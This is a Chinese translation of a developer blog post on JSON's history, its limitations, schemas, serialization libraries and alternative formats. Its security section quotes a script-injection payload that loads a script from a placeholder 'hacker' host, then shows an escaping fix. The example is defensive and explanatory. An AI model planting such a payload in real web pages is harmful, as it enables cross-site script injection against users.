# JSON、JSON、JSON、JSON

> 原文：<https://dev.to/stereobooster/json-json-json-4ed7>

关于 JSON 的一切。

## 开始

JSON——脱胎于 web 平台的限制和一点创造力。有 XMLHttpRequest 向服务器发出请求，而不需要完全重新加载，但是 XML 在网络上“很重”,所以道格拉斯·克洛克福特想到了一个聪明的办法——我们可以使用 JavaScript 对象符号和`eval`以简单的方式将数据从服务器传递到客户端，反之亦然。但是执行任意代码(`eval`)是不安全的，尤其是当它来自第三方时。所以下一步是标准化它，并为它实现一个特定的解析器。后来它成为所有浏览器的标准，现在我们可以把它用作`JSON.parse`。

## 限制

考虑到它是如何诞生的，它有一些局限性

### 非对称编码/解码

你知道 JS 如何试图假装类型错误不存在，并试图不惜任何代价强迫，即使没有多大意义。这意味着`x == JSON.parse(JSON.stringify(x))`并不总是成立的。例如:

*   `Date`将被转换为`string`表示，解码后将保持为`string`
*   `Map`、`WeakMap`、`Set`、`WeakSet`将被转入`"{}"`——将丢失内容和类型
*   `BigInt`换一个摔投`TypeError: Do not know how to serialize a BigInt`
*   一个函数将被转换为`undefined`
*   `undefined`将转换为`undefined`
*   ES6 类和`new function(){}`将被转换成一个普通对象的表示，但是会丢失类型

**解决方案:**这里一个可能的解决方案是使用静态类型系统，比如 TypeScript 或 Flow，来防止非对称类型:

```
// inspired by https://github.com/tildeio/ts-std/blob/master/src/json.ts
export type JSONValue =
  | string
  | number
  | boolean
  | null
  | JSONObject
  | JSONArray;
type JSONObject = {[key: string]: JSONValue};
type JSONArray = Array<JSONValue>;

export const symetricStringify = (x: JSONValue) => JSON.stringify(x); 
```

Enter fullscreen mode Exit fullscreen mode

虽然它不会把我们从`TypeError: Converting circular structure to JSON`中拯救出来，但以后会得到它。

### 安全性:脚本注入

如果您使用 JSON 作为在 HTML 内部将数据从服务器传递到客户端的方式，例如，在服务器端呈现的情况下为 Redux 存储初始值，或者在 Ruby 中为`gon`，请注意存在脚本注入攻击的风险

```
<script>
  var data = {user_input: "</script><script src=http://hacker/script.js>"} </script> 
```

Enter fullscreen mode Exit fullscreen mode

**解决方案:**在将 JSON 传递给 HTML 之前对其进行转义

```
const UNSAFE_CHARS_REGEXP = /[<>\/\u2028\u2029]/g;
// Mapping of unsafe HTML and invalid JavaScript line terminator chars to their
// Unicode char counterparts which are safe to use in JavaScript strings.
const ESCAPED_CHARS = {
  "<": "\\u003C",
  ">": "\\u003E",
  "/": "\\u002F",
  "\u2028": "\\u2028",
  "\u2029": "\\u2029"
};
const escapeUnsafeChars = unsafeChar => ESCAPED_CHARS[unsafeChar];
const escape = str => str.replace(UNSAFE_CHARS_REGEXP, escapeUnsafeChars);
export const safeStringify = (x) => escape(JSON.stringify(x)); 
```

Enter fullscreen mode Exit fullscreen mode

旁注:[JSON 实现漏洞集合](https://github.com/tunz/js-vuln-db)

### 缺乏图式

JSON 是无模式的——这是有意义的，因为 JS 是动态类型的。但这意味着你需要自己验证形状(类型)`JSON.parse`不会为你做这件事。

**解决方案:**我之前写过这个问题——使用 [IO 验证](https://dev.to/stereobooster/pragmatic-types-io-validation-or-how-to-handle-json-based-apis-in-statically-typed-language-1d9m)

附注:还有其他解决方案，比如 JSON API、Swagger 和 GraphQL。

### 缺少模式和串行化器/解析器

拥有一个解析器模式可以解决`Date`的不对称问题。如果我们知道在某个地方我们期望`Date`，我们可以使用字符串表示来创建 JS `Date`。

拥有序列化程序的模式可以解决`BigInt`、`Map`、`WeakMap`、`Set`、`WeakSet`、ES6 类和`new function(){}`的问题。我们可以为每种类型提供特定的序列化器/解析器。

```
import * as t from 'io-ts'

const DateFromString = new t.Type<Date, string>(
  'DateFromString',
  (m): m is Date => m instanceof Date,
  (m, c) =>
    t.string.validate(m, c).chain(s => {
      const d = new Date(s)
      return isNaN(d.getTime()) ? t.failure(s, c) : t.success(d)
    }),
  a => a.toISOString()
) 
```

Enter fullscreen mode Exit fullscreen mode

附注:另请参见[本提案](https://github.com/gibson042/ecma262-proposal-JSON-parse-with-source)

### 缺乏图式和表现

拥有一个模式可以提高解析器的性能。例如，参见 [jitson](https://github.com/mafintosh/jitson) 和 [FAD.js](http://www.vldb.org/pvldb/vol10/p1778-bonetta.pdf)

附注:参见[fast-JSON-stringy](https://github.com/fastify/fast-json-stringify)

### 流解析器/串行化器

JSON 发明的时候，没有人想到用它来处理千兆字节的数据。如果你想做这样的事情，看看一些流解析器。

此外，您可以使用 JSON 流来改善慢速后端的 UX——参见 [oboejs](http://oboejs.com/) 。

## 超越 JSON

### 未评价

如果你想序列化实际的 JS 代码并保留类型，JSON 的引用和循环结构是不够的。你会需要“uneval”。请查看以下内容:

*   [贬值](https://github.com/Rich-Harris/devalue)
*   [拉韦](https://github.com/jed/lave)
*   [js-stringify](https://github.com/pugjs/js-stringify)
*   [节点未赋值](https://github.com/chakrit/node-uneval)
*   [node-tosource](https://github.com/marcello3d/node-tosource) -将 JavaScript 对象转换为源代码

其他“变奏曲”:

*   用纯函数扩展的 JSON
*   [serialize-javascript](https://github.com/yahoo/serialize-javascript) -将 javascript 序列化为 JSON 的超集，包括正则表达式、日期和函数
*   [arson](https://github.com/benjamn/arson) -针对任意对象的高效编码器和解码器
*   用特殊的 JSON 编码保存对象行为(原型)和引用循环
*   序列化器(serializer)——将复杂的对象图序列化为 JSON 和 Javascript 类，或者从 JSON 和 Javascript 类中反序列化

### 作为配置文件

JSON 的发明是为了传输数据，而不是为了存储配置。然而，人们使用它进行配置，因为这是一个简单的选择。

JSON 缺少注释，需要用引号将键括起来，禁止在数组或字典的末尾使用 coma，需要成对的`{}`和`[]`。除了使用另一种格式，如 JSON5 或 YAML 或 TOML，没有真正的解决方案。

### 二进制数据

JSON 比 XML 更紧凑，但不是最紧凑的。二进制格式更有效。签出消息包。

补充说明:GraphQL 没有绑定到 JSON，所以您可以使用 MessagePack 和 GraphQL 。

### 二进制数据和模式

模式采用二进制格式允许进行一些疯狂的优化，比如随机访问或零拷贝。检查一下 [Cap-n-Proto](https://capnproto.org/) 。

### 查询语言

JSON(任何与 JS 相关的东西)都非常受欢迎，所以人们越来越需要使用它，并开始围绕它开发工具，如 [JSONPath](http://goessner.net/articles/JsonPath/) 和 [jq](https://stedolan.github.io/jq/) 。

## 我错过了什么吗？

如果我错过了什么，请留言。感谢阅读。

* * *

在 [twitter](https://twitter.com/stereobooster) 和 [github](https://github.com/stereobooster) 关注我。